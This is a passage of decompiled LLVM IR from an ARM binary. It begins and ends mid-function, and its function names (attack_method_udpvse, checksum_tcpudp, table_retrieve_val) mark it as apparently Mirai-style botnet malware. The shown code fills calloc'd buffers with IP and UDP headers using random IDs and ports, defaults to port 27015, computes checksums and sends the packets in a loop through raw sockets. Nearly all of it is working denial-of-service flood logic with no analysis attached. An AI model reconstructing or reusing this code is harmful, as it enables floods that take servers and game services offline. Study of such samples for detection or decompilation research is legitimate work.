  br i1 %v9_9e90, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %dec_label_pc_a034, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e98
  %v1_9ea0 = load i32, i32* @r5, align 4
  %v2_9ea0 = add i32 %v1_9ea0, 16
  %v3_9ea0 = inttoptr i32 %v2_9ea0 to i32*
  %v4_9ea0 = load i32, i32* %v3_9ea0, align 4
  store i32 %v4_9ea0, i32* %r3.global-to-local, align 4
  %v2_9ea4 = load i32, i32* @r6, align 4
  %v3_9ea4 = add i32 %v2_9ea4, 16
  %v4_9ea4 = inttoptr i32 %v3_9ea4 to i32*
  store i32 %v4_9ea0, i32* %v4_9ea4, align 4
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_9eb8:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034, %dec_label_pc_a048
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9ebc = load i32, i32* @r5, align 4
  %v3_9ebc = add i32 %v2_9ebc, 10
  %v4_9ebc = inttoptr i32 %v3_9ebc to i16*
  store i16 0, i16* %v4_9ebc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  store i32 %v0_9ec4, i32* @r0, align 4
  %v2_9ec8 = call i32 @checksum_generic(i32 %v0_9ec4, i32 20)
  %v3_9ec8 = trunc i32 %v2_9ec8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ed0 = load i32, i32* @r5, align 4
  %v4_9ed0 = add i32 %v3_9ed0, 10
  %v5_9ed0 = inttoptr i32 %v4_9ed0 to i16*
  store i16 %v3_9ec8, i16* %v5_9ed0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v0_9ed8 to i16
  %v2_9ed8 = load i32, i32* @r6, align 4
  %v3_9ed8 = add i32 %v2_9ed8, 10
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i16*
  store i16 %v1_9ed8, i16* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* @r6, align 4
  store i32 %v0_9edc, i32* @r0, align 4
  %v2_9ee0 = call i32 @checksum_generic(i32 %v0_9edc, i32 20)
  %v3_9ee0 = trunc i32 %v2_9ee0 to i16
  %v3_9ee4 = load i32, i32* @r6, align 4
  %v4_9ee4 = add i32 %v3_9ee4, 10
  %v5_9ee4 = inttoptr i32 %v4_9ee4 to i16*
  store i16 %v3_9ee0, i16* %v5_9ee4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r7, align 4
  store i32 %v0_9eec, i32* @r1, align 4
  %v1_9ef0 = add i32 %v0_9eec, 4
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i16*
  %v3_9ef0 = load i16, i16* %v2_9ef0, align 2
  %v4_9ef0 = zext i16 %v3_9ef0 to i32
  store i32 %v4_9ef0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9ef8 = add i32 %v0_9eec, 6
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i16*
  store i16 0, i16* %v4_9ef8, align 2
  %v0_9efc = load i32, i32* @r6, align 4
  %v4_9f00 = call i32 @checksum_tcpudp(i32 %v0_9efc, i32 %v0_9eec, i32 %v4_9ef0, i32 %stack_var_-124.0.ph)
  %v5_9f00 = trunc i32 %v4_9f00 to i16
  %v3_9f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f04, i32* %r2.global-to-local, align 4
  %v3_9f08 = mul i32 %v3_9f04, 32
  store i32 %v3_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i32*
  %v3_9f0c = load i32, i32* %v2_9f0c, align 4
  %v5_9f10 = mul i32 %v3_9f04, 24
  store i32 %v5_9f10, i32* %r3.global-to-local, align 4
  %v1_9f14 = load i32, i32* @sb, align 4
  %v2_9f14 = add i32 %v1_9f14, %v5_9f10
  store i32 %v2_9f14, i32* @lr, align 4
  %v2_9f18 = add i32 %v2_9f14, 4
  %v3_9f18 = inttoptr i32 %v2_9f18 to i32*
  store i32 %v3_9f0c, i32* %v3_9f18, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9f20 = load i32, i32* @r7, align 4
  %v4_9f20 = add i32 %v3_9f20, 6
  %v5_9f20 = inttoptr i32 %v4_9f20 to i16*
  store i16 %v5_9f00, i16* %v5_9f20, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f28 = trunc i32 %v0_9f28 to i16
  %v2_9f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f28 = load i32, i32* @sb, align 4
  %v4_9f28 = add i32 %v3_9f28, %v2_9f28
  %v5_9f28 = inttoptr i32 %v4_9f28 to i16*
  store i16 %v1_9f28, i16* %v5_9f28, align 2
  %v0_9f2c = load i32, i32* @r4, align 4
  %v1_9f2c = trunc i32 %v0_9f2c to i16
  %v2_9f2c = load i32, i32* @lr, align 4
  %v3_9f2c = add i32 %v2_9f2c, 2
  %v4_9f2c = inttoptr i32 %v3_9f2c to i16*
  store i16 %v1_9f2c, i16* %v4_9f2c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9f34 = load i32, i32* @r5, align 4
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r8, align 4
  store i32 %v0_9f3c, i32* %r2.global-to-local, align 4
  %v0_9f40 = load i32, i32* @lr, align 4
  %v0_9f44 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f48 = call i32 @__libc_sendto(i32 %v3_9bbc, i32 %v0_9f34, i32 %v0_9f3c, i32 16384, i32 %v0_9f40, i32 %v0_9f44)
  %v3_9f4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f4c, i32* %r3.global-to-local, align 4
  %v1_9f50 = add i32 %v3_9f4c, 1
  %v1_9f54 = load i32, i32* @sl, align 4
  %v9_9f54 = icmp eq i32 %v1_9f50, %v1_9f54
  store i1 %v9_9f54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f50, i32* %stack_var_-44, align 4
  %v6_9f5c = icmp slt i32 %v1_9f50, %v1_9f54
  br i1 %v6_9f5c, label %dec_label_pc_9e3c, label %dec_label_pc_9e28

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e3c
  %v1_9f64 = add i32 %v2_9e44, 16
  %v2_9f64 = inttoptr i32 %v1_9f64 to i32*
  %v3_9f64 = load i32, i32* %v2_9f64, align 4
  store i32 %v3_9f64, i32* %r4.global-to-local, align 4
  %v0_9f68 = call i32 @rand_next()
  %v3_9f6c = load i32, i32* %stack_var_-44, align 4
  %v5_9f74 = mul i32 %v3_9f6c, 24
  %v0_9f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f78 = and i32 %v0_9f78, 16711680
  store i32 %v1_9f78, i32* %ip.global-to-local, align 4
  %v3_9f7c = udiv i32 %v0_9f78, 16777216
  %v4_9f80 = udiv i32 %v1_9f78, 256
  %v5_9f80 = or i32 %v4_9f80, %v3_9f7c
  store i32 %v5_9f80, i32* %r2.global-to-local, align 4
  %v1_9f84 = load i32, i32* @sb, align 4
  %v2_9f84 = add i32 %v1_9f84, %v5_9f74
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = and i32 %v0_9f78, 65280
  store i32 %v1_9f88, i32* %r3.global-to-local, align 4
  %v1_9f8c = add i32 %v2_9f84, 20
  %v2_9f8c = inttoptr i32 %v1_9f8c to i8*
  %v3_9f8c = load i8, i8* %v2_9f8c, align 1
  %v4_9f8c = zext i8 %v3_9f8c to i32
  store i32 %v4_9f8c, i32* %ip.global-to-local, align 4
  %v5_9f94 = call i32 @llvm.bswap.i32(i32 %v0_9f78)
  %v7_9f98 = lshr i32 %v0_9f68, %v4_9f8c
  %v8_9f98 = add i32 %v7_9f98, %v5_9f94
  store i32 %v8_9f98, i32* %r2.global-to-local, align 4
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  %v5_9fb4 = call i32 @llvm.bswap.i32(i32 %v8_9f98)
  store i32 %v5_9fb4, i32* %r3.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 16
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb4, i32* %v3_9fbc, align 4
  br i1 %v2_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  %v0_9fc4 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9fd0 = load i32, i32* @fp, align 4
  %v9_9fd0 = icmp eq i32 %v0_9fd0, 65535
  store i1 %v9_9fd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9fd4 = load i32, i32* @r5, align 4
  %v2_9fd4 = add i32 %v1_9fd4, 12
  %v3_9fd4 = inttoptr i32 %v2_9fd4 to i32*
  store i32 %v0_9fc4, i32* %v3_9fd4, align 4
  br i1 %v9_9fd0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge

dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge:    ; preds = %dec_label_pc_9fc4
  %v1_9e84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e70
  %v0_9fdc = call i32 @rand_next()
  %v3_9fe4 = urem i32 %v0_9fdc, 65536
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v1_9ff0 = sub nsw i32 999, %v3_9fe4
  store i32 %v1_9ff0, i32* %r3.global-to-local, align 4
  %v1_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9ff4 = icmp eq i32 %v3_9c08, %v1_9ff4
  store i1 %v9_9ff4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ff8 = trunc i32 %v0_9fdc to i16
  %v2_9ff8 = load i32, i32* @r5, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 4
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i16*
  store i16 %v1_9ff8, i16* %v4_9ff8, align 2
  %v0_9ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_9ffc = trunc i32 %v0_9ffc to i16
  %v2_9ffc = load i32, i32* @r6, align 4
  %v3_9ffc = add i32 %v2_9ffc, 4
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v1_9ffc, i16* %v4_9ffc, align 2
  br i1 %v9_9ff4, label %dec_label_pc_a004, label %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge

dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge:    ; preds = %dec_label_pc_9fdc
  %v1_9e90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e8c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fdc, %dec_label_pc_9e80
  %v0_a004 = call i32 @rand_next()
  %v1_a004 = trunc i32 %v0_a004 to i16
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v1_a00c = load i32, i32* %r4.global-to-local, align 4
  %v9_a00c = icmp eq i32 %v3_9c0c, %v1_a00c
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  %v3_a010 = load i32, i32* @r5, align 4
  %v4_a010 = add i32 %v3_a010, 44
  %v5_a010 = inttoptr i32 %v4_a010 to i16*
  store i16 %v1_a004, i16* %v5_a010, align 2
  br i1 %v9_a00c, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_a018:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  %v0_a018 = call i32 @rand_next()
  %v1_a018 = trunc i32 %v0_a018 to i16
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_a018
  %v3_a02831 = load i32, i32* @r7, align 4
  %v4_a02832 = add i32 %v3_a02831, 2
  %v5_a02833 = inttoptr i32 %v4_a02832 to i16*
  store i16 %v1_a018, i16* %v5_a02833, align 2
  br label %dec_label_pc_a034

bb85:                                             ; preds = %dec_label_pc_a018
  %v1_a024 = load i32, i32* @r5, align 4
  %v2_a024 = add i32 %v1_a024, 16
  %v3_a024 = inttoptr i32 %v2_a024 to i32*
  %v4_a024 = load i32, i32* %v3_a024, align 4
  store i32 %v4_a024, i32* %r3.global-to-local, align 4
  %v3_a028 = load i32, i32* @r7, align 4
  %v4_a028 = add i32 %v3_a028, 2
  %v5_a028 = inttoptr i32 %v4_a028 to i16*
  store i16 %v1_a018, i16* %v5_a028, align 2
  %v1_a02c = load i32, i32* %r3.global-to-local, align 4
  %v2_a02c = load i32, i32* @r6, align 4
  %v3_a02c = add i32 %v2_a02c, 16
  %v4_a02c = inttoptr i32 %v3_a02c to i32*
  store i32 %v1_a02c, i32* %v4_a02c, align 4
  br label %dec_label_pc_9eac

dec_label_pc_a034:                                ; preds = %.thread30, %dec_label_pc_9e98
  %v0_a034 = call i32 @rand_next()
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  %v1_a040 = load i32, i32* @r6, align 4
  %v2_a040 = add i32 %v1_a040, 16
  %v3_a040 = inttoptr i32 %v2_a040 to i32*
  store i32 %v0_a034, i32* %v3_a040, align 4
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034
  %v0_a048 = load i32, i32* @r7, align 4
  %v1_a048 = add i32 %v0_a048, 8
  store i32 %v5_9b54, i32* %r1.global-to-local, align 4
  %v2_a050 = inttoptr i32 %v1_a048 to i16*
  %v3_a050 = call i32 @rand_str(i16* %v2_a050, i32 %v5_9b54)
  br label %dec_label_pc_9eb8

dec_label_pc_a058:                                ; preds = %dec_label_pc_9bcc
  %v1_a05c = call i32 @__GI___libc_close(i32 %v3_9bbc)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %entry, %dec_label_pc_a058
  %v1_a068 = phi i32 [ %v3_9bbc, %entry ], [ %v1_a05c, %dec_label_pc_a058 ]
  store i32 %v3_9a6c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a6c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a6c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a068

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9bf4
  store i32 %v5_9b54, i32* %r2.global-to-local, align 4
  %v1_a074 = add i32 %v5_9b54, 8
  store i32 %v1_a074, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e28.preheader

; uselistorder directives
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i16 %v1_a018, { 1, 0 }
  uselistorder i32 %v0_9fdc, { 1, 0 }
  uselistorder i32 %v5_9fb4, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f54, { 1, 2, 0 }
  uselistorder i32 %v1_9f50, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9f04, { 1, 0, 2 }
  uselistorder i32 %v0_9eec, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e50, { 1, 0, 2 }
  uselistorder i1 %v7_9e68, { 2, 1, 0 }
  uselistorder i1 %v2_a03c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_a020, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9dc4, { 1, 0 }
  uselistorder i32 %v4_9d3813, { 1, 0 }
  uselistorder i32 %v3_9c5c, { 1, 0 }
  uselistorder i32 %v3_9c40, { 1, 2, 0 }
  uselistorder i32 %v1_9c3c, { 1, 0 }
  uselistorder i32 %v1_9c00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bf4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bec, { 1, 0 }
  uselistorder i1 %v7_9bc0, { 1, 0 }
  uselistorder i32 %v3_9bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9ba8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b74, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b54, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9b08, { 1, 0 }
  uselistorder i32 %v1_9ae4, { 2, 1, 0 }
  uselistorder i32 %v5_9adc, { 1, 0 }
  uselistorder i8 %v5_9ac0, { 0, 2, 1 }
  uselistorder i32 %v6_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a88, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9e28.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_method_udpvse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a088 = load i32, i32* @r4, align 4
  %v27_a088 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a0a4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a0a8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0a4, i32* @fp, align 4
  %v0_a0b8 = load i32, i32* @r4, align 4
  %v4_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v5_a0bc = call i32 @attack_get_opt_int(i32 %v0_a0b8, i32* %v4_a0bc, i32 2, i32 0)
  %v1_a0c8 = urem i32 %v5_a0bc, 256
  store i32 %v1_a0c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0d4 = load i32, i32* @r4, align 4
  %v0_a0d8 = load i32, i32* @r5, align 4
  %v5_a0dc = trunc i32 %v5_a0bc to i8
  %v6_a0e0 = inttoptr i32 %v0_a0d8 to i32*
  %v7_a0e0 = call i32 @attack_get_opt_int(i32 %v0_a0d4, i32* %v6_a0e0, i32 3, i32 65535)
  %v0_a0e4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0e0, i32* @r7, align 4
  %v0_a0f4 = load i32, i32* @r4, align 4
  %v4_a0f8 = inttoptr i32 %v0_a0e4 to i32*
  %v5_a0f8 = call i32 @attack_get_opt_int(i32 %v0_a0f4, i32* %v4_a0f8, i32 4, i32 64)
  %v1_a100 = urem i32 %v5_a0f8, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  %v6_a118 = inttoptr i32 %v0_a104 to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 5, i32 0)
  %v1_a124 = urem i32 %v7_a118, 256
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a130 = load i32, i32* @r4, align 4
  %v0_a134 = load i32, i32* @r5, align 4
  %v5_a13c = inttoptr i32 %v0_a134 to i32*
  %v6_a13c = call i32 @attack_get_opt_int(i32 %v0_a130, i32* %v5_a13c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  store i32 %v6_a13c, i32* @r6, align 4
  %v0_a154 = load i32, i32* @r4, align 4
  %v4_a158 = inttoptr i32 %v0_a14c to i32*
  %v5_a158 = call i32 @attack_get_opt_int(i32 %v0_a154, i32* %v4_a158, i32 7, i32 27015)
  store i32 %v5_a158, i32* @r4, align 4
  %v1_a164 = call i32 @table_unlock_val(i32 20)
  %v3_a170 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a184 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_a188 = icmp eq i32 %v3_a184, -1
  store i1 %v7_a188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a184, i32* @sb, align 4
  br i1 %v7_a188, label %dec_label_pc_a4b0, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a19c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v3_a184, i32 0, i32 3, i32 %v6_a19c, i32 ptrtoint (i32* @0 to i32))
  %v7_a1b4 = icmp eq i32 %v5_a1b0, -1
  store i1 %v7_a1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b4, label %dec_label_pc_a4a8, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a194
  %v0_a1bc = load i32, i32* @r4, align 4
  %v3_a1bc = mul i32 %v0_a1bc, 65536
  store i32 %v3_a1bc, i32* @lr, align 4
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v0_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = mul i32 %v0_a1c4, 65536
  store i32 %v3_a1c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a1cc = urem i32 %v0_a1c0, 65536
  %v3_a1d0 = urem i32 %v0_a1c4, 65536
  store i32 %v3_a1d0, i32* %r2.global-to-local, align 4
  %v3_a1d4 = urem i32 %v0_a1bc, 65536
  store i32 %v3_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r8, align 4
  %v2_a1d8 = icmp eq i32 %v0_a1d8, 0
  store i1 %v2_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a1d8, label %dec_label_pc_a314.preheader, label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1bc
  %tmp34 = mul i32 %v0_a1c0, 256
  %v3_a200 = and i32 %tmp34, 65280
  store i32 %v3_a200, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a1c4, 256
  %v3_a204 = and i32 %tmp35, 65280
  store i32 %v3_a204, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a1bc, 256
  %v3_a208 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a1c0, 256
  %v4_a20c = urem i32 %tmp37, 256
  %v5_a20c = or i32 %v4_a20c, %v3_a200
  store i32 %v5_a20c, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a1c4, 256
  %v4_a210 = urem i32 %tmp38, 256
  %v5_a210 = or i32 %v4_a210, %v3_a204
  store i32 %v5_a210, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a1bc, 256
  %v4_a214 = urem i32 %tmp39, 256
  %v5_a214 = or i32 %v4_a214, %v3_a208
  store i32 %v5_a214, i32* @r7, align 4
  %v1_a29c = trunc i32 %v5_a0f8 to i8
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %.thread, %dec_label_pc_a1f0
  %v2_a220 = call i32 @calloc(i32 128, i32 1)
  %v3_a224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a224, i32* %r2.global-to-local, align 4
  %v5_a22c = mul i32 %v3_a224, 24
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = load i32, i32* @fp, align 4
  %v2_a230 = load i32, i32* @r4, align 4
  %v5_a230 = mul i32 %v2_a230, 4
  %v6_a230 = add i32 %v5_a230, %v1_a230
  %v7_a230 = inttoptr i32 %v6_a230 to i32*
  store i32 %v2_a220, i32* %v7_a230, align 4
  %v0_a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_a234 = load i32, i32* @sl, align 4
  %v2_a234 = add i32 %v1_a234, %v0_a234
  store i32 %v2_a234, i32* %r3.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  %v1_a238 = load i32, i32* %r2.global-to-local, align 4
  %v4_a238 = mul i32 %v1_a238, 4
  %v5_a238 = add i32 %v4_a238, %v0_a238
  %v6_a238 = inttoptr i32 %v5_a238 to i32*
  %v7_a238 = load i32, i32* %v6_a238, align 4
  store i32 %v7_a238, i32* @lr, align 4
  %v1_a240 = inttoptr i32 %v7_a238 to i8*
  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
